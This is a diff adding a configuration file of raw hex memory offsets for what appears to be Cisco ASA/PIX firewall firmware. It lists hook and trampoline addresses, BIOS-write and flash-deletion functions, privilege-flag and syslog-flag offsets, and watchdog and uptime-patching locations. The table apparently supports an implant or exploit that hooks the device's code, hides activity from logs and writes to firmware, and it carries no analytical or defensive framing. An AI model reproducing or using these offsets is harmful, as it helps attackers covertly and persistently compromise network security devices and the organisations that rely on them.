@@ -1,0 +1,167 @@
+; --- SECTION I ---
+;
+0x00000711            
+0x66c000              
+0x0   0x009b8948      
+0x1   0x009b8d34      
+0x2   0x00113f90      
+0x3   0x004fccf8      
+0x4   0x00114094      
+0x5   0x00ec2c50      
+0x6   0x00eb0428      
+0x7   0x00ecbc14      
+0x8   0x009b85f4      
+0x9   0x00eb8d44      
+0xa   0x001137e4      
+0xb   0x00000014      
+0xc   0x00000010      
+0xd   0x0000006c      
+0xe   0x00000078      
+0xf   0x00ecba34      
+0x15  0x0011166c      
+0x16  0x001125c4      
+0x17  0x00113000      
+0x18  0x007cf010      
+0x19  0x0000001c      
+0x1a  0x011b4068      
+0x1b  0x04      
+0x1c  0x0c      
+0x1d  0x24      
+0x1e  0x00      
+0x1f  0x10      
+0x20  0x0050037c      
+0x21  0x00501bdc      
+0x22  0x0050090c      
+0x23  0x0051264c      
+0x24  0x00d4c6e0      
+0x25  0x00d50ce4      
+0x26  0x004fec8c      
+0x27  0x005039e4      
+0x28  0x0081b184      
+0x2a  0x44      
+0x2b  0x3c            
+0x2c  0x24            
+0x2d  0x0068d380      
+0x2e  0x18c      
+0x2f  0x0113c228      
+0x30  0x00ff0ba8      
+0x31  0x00000014      
+0x32  0x00000020      
+0x33  0x00000018      
+0x34  0x01124040      
+0x35  0x011b3848      
+0x36  0x00819fe0      
+0x37  0x00000123      
+0x38  0x4c      
+0x39  0x68      
+0x3a  0x41c      
+0x3b  0x0045a938      
+0x3c  0x0045a9f0      
+0x3d  0x0045a378      
+0x3e  0x0045a838      
+0x3f  0x20        
+0x40  0x011cdbb0      
+0x41  0x0051c800      
+0x42  0x00ebeef2      
+0x43  0x004f4440      
+0x44  0x0046bee0      
+0x45  0x0066f000      
+0x46  0x0079749c      
+0x47  0x2c      
+;
+; --- END OF SECTION I ---
+;
+:EOS:
+;
+; --- SECTION II ---
+;
+HookLocation        0x0068c46a      
+JmpLocation         0x0068f47e      
+InterfaceAddr       0x00ff0ba8      
+InterfaceLeng       0x00000198      
+IntSecurityOffset   0x1c      
+IntNameOffset       0x168      
+IntNumOffset        0x123      
+IntVlanOffset       0x10      
+IntIPOffset         0x20      
+IntNetmaskOffset    0x24      
+FlashClassAddr      0x00000000      
+CryptoDeviceAddr    0x011b8b48      
+ArpTableAddrPtr     0x00fe2ff0      
+ArpTableLastPtr     0x00fe2ff8      
+NumInterfaces       0x00000000      
+IfaceStruct2        0x00000000      
+IfaceStruct2Len     0x00      
+BiosClassAddr       0x011c6018      
+BiosWriteAddr1      0x003c5b2c      
+BiosWriteAddr2      0x003c8264      
+BiosWriteAddr3      0x003c8978      
+BiosWriteAddr4      0x003c9194      
+BiosWriteAddr5      0x00000000      
+BiosWriteOffset     0x00000020      
+FlashMkdirAddress   0x0045b058      
+ASAFlashRmdirAddress   0x007986c4   
+PIXFlashRmdirAddress   0x003c130c      
+ASAFlashRmfileAddress  0x0079866c      
+PIXFlashRmfileAddress  0x003c119c      
+FlashDirlistAddress 0x0045ab80      
+FlashGetSizeAddress 0x0045a064      
+FlashChmodAddress   0x0045acb8      
+FlashMoveFileAddress 0x0045addc     
+FlashGetFileInfoAddress 0x0045b288  
+FlashGetSpaceAddress 0x0045c5ac     
+FlashFileInfoSizeOffset 0x0000002c  
+GetPlatformStringAddr 0x00eb4518  
+ASARestatFlashFlagAddr 0x011da578 
+AnnounceFunc        0x00113ee0      
+DevIoctlOffset      0x00000070      
+CIStartFunc         0x001508d8      
+CommandListAddr     0x0100ee84      
+DeviceListPtrAddr   0x010ea3c8      
+DeviceNextPtrOffset 0x50            
+StrcmpFuncAddr      0x00ec00c8      
+SyslogFlagPtrAddr   0x01278990      
+PGDGETValue         0x85b00002      
+PGDPUSHValue        0x85b00003      
+PGDSETValue         0x85b00000      
+StdChOffset         0x64            
+StdErrOffset        0x68            
+PrivFlagOffset      0x0c            
+UnameOffset         0x14            
+EnvPtrOffset        0x70            
+SyslogOffset        0x000009a0      
+Open                0x00113f90      
+CLIHookAddress       0x00150da0      
+WatchDogTimeout     0x00f2eec4      
+UpTimeCounter       0x011b3848      
+Get_uptime_secs_addr            0x007f7730  
+Modified_getuptime_code_addr    0x0015e52f  
+Get_uptime_secs_call_instr_addr 0x0015d969  
+AvailMemoryPtr      0x011b4570      
+;
+srand               0x00ecba88
+BN_new              0x00e2ae2c  
+BN_free             0x00e2adc8
+BN_mod_exp          0x00e5c81c
+BN_CTX_new          0x00e2c510
+BN_CTX_free         0x00e2c584
+BN_bin2bn           0x00e2b354
+BN_bn2bin           0x00e2b440
+BN_bn2hex           0x00e66d4c
+BN_num_bits         0x00e2ad28
+DH_p                0x00f42730 
+aesEncrypt          0x001793d4 
+aesKeySet           0x00172a30 
+slimHookAddr        0x0068c5b0 
+slimTrampoline      0x00442199 
+HookByte1           0x83
+HookBytes2to5       0x006afcc4
+InterfaceOffset     0x00000014
+codepageBase        0x011b4060 
+codeSectionStart    0x00100000 
+codeSectionEnd      0x00f2da60 
+;
+; --- END OF SECTION II ---
+;
+:EOS:
+;
